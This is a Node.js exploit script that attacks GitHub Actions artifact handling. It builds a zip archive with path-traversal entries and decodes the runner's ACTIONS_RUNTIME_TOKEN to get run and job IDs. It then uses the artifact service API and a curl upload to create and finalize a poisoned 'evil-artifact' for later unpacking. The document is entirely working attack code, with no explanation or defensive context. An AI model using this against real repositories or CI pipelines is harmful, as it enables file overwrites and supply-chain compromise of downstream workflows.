const { execSync } = require('child_process');
const fs = require('fs');

// 1. craft zip with traversal entries
execSync('python3 makezip.py', { stdio: 'inherit', cwd: __dirname });
const zip = fs.readFileSync(__dirname + '/evil.zip');
console.log('zip bytes:', zip.length);

// 2. backend ids from runtime token scp claim
const tok = process.env.ACTIONS_RUNTIME_TOKEN;
const payload = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString());
const pair = payload.scp.split(' ').find((s) => s.startsWith('Actions.Results:')).split(':');
const run = pair[1];
const job = pair[2];
console.log('run:', run.slice(0, 8), 'job:', job.slice(0, 8));

const base =
  (process.env.ACTIONS_RESULTS_URL || 'https://results-receiver.actions.githubusercontent.com/').replace(/\/$/, '') +
  '/twirp/github.actions.results.api.v1.ArtifactService/';

const call = async (m, b) => {
  const r = await fetch(base + m, {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + tok, 'Content-Type': 'application/json' },
    body: JSON.stringify(b),
  });
  return r.json();
};

(async () => {
  const cr = await call('CreateArtifact', {
    workflowRunBackendId: run,
    workflowJobRunBackendId: job,
    name: 'evil-artifact',
    version: 1,
  });
  console.log('create ok:', cr.ok);
  if (!cr.ok || !cr.signed_upload_url) {
    console.log('create failed:', JSON.stringify(cr));
    process.exit(1);
  }
  fs.writeFileSync('/tmp/evil-upload.bin', zip);
  const up = execSync(
    'curl -s -o /dev/null -w "%{http_code}" -X PUT "' + cr.signed_upload_url + '" -H "x-ms-blob-type: BlockBlob" --data-binary @/tmp/evil-upload.bin',
    { encoding: 'utf8' }
  );
  console.log('blob upload HTTP:', up);
  const fin = await call('FinalizeArtifact', {
    workflowRunBackendId: run,
    workflowJobRunBackendId: job,
    name: 'evil-artifact',
    size: String(zip.length),
  });
  console.log('finalize:', JSON.stringify(fin));
})().catch((e) => {
  console.error('FATAL', e.message);
  process.exit(1);
});
